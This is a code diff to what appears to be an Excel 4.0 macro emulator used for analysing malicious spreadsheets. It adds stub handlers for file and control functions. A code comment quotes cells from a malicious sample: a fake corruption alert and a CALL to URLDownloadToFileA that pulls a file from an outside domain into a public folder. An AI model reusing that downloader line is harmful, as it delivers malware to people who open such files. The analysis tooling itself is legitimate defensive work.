@@ -20,8 +20,14 @@ func_lookup["_concat"] = _concat
 
 def _plus(params):
     r = 0
-    for p in params:
-        r += int(p)
+    try:
+        for p in params:
+            r += int(p)
+    except ValueError:
+        # Just do string concat.
+        r = ""
+        for p in params:
+            r += str(p)
     return r
 func_lookup["_plus"] = _plus
 
@@ -108,6 +114,50 @@ def FORMULA(params):
     return r
 func_lookup["FORMULA"] = FORMULA
 
+def WORKBOOK_HIDE(params):
+    return "WORKBOOK.HIDE"
+func_lookup["WORKBOOK.HIDE"] = WORKBOOK_HIDE
+
+def GOTO(params):
+    return "GOTO"
+func_lookup["GOTO"] = GOTO
+
+def GET_WORKSPACE(params):
+    return "GET.WORKSPACE"
+func_lookup["GET.WORKSPACE"] = GET_WORKSPACE
+
+def NOW(params):
+    return 12345
+func_lookup["NOW"] = NOW
+
+def WAIT(params):
+    return "WAIT"
+func_lookup["WAIT"] = WAIT
+
+def FOPEN(params):
+    return "ACTION: FILE:FOPEN(" + str(params) + ")"
+func_lookup["FOPEN"] = FOPEN
+
+def FPOS(params):
+    return "ACTION: FILE:FPOS(" + str(params) + ")"
+func_lookup["FPOS"] = FPOS
+
+def FREAD(params):
+    return "ACTION: FILE:FREAD(" + str(params) + ")"
+func_lookup["FREAD"] = FREAD
+
+def FCLOSE(params):
+    return "ACTION: FILE:FCLOSE(" + str(params) + ")"
+func_lookup["FCLOSE"] = FCLOSE
+
+def FILE_DELETE(params):
+    return "ACTION: FILE:FILE.DELETE(" + str(params) + ")"
+func_lookup["FILE.DELETE"] = FILE_DELETE
+
+def IF(params):
+    return "IF"
+func_lookup["IF"] = IF
+
 ####################################################################
 def eval(func_name, params, sheet):
     """
@@ -146,9 +196,17 @@ def eval(func_name, params, sheet):
 
     # Does this value get written to a cell?
     if (update_index is not None):
+        # TODO: r is something in the real XLM format. Need to parse real XLM to an
+        # XLM object.
+        #
+        # (7, 10)	=	'=ALERT("The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt.",2)'
+        # (7, 11)	=	'=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://rosannahtacey.xyz/vg43","c:\Users\Public\bmjn5ef.html",0,0)'
+        print("\n\n\nLOOK HERE!!\n\n\n\n\n\n\n")
         new_item = XLM.stack_item.stack_str(str(r))
         new_cell = XLM.XLM_Object.XLM_Object(update_index[0], update_index[1], [new_item])
         sheet.cells[update_index] = new_cell
+        if (update_index not in sheet.xlm_cell_indices):
+            sheet.xlm_cell_indices.append(update_index)
 
     # Return the result.
     return r
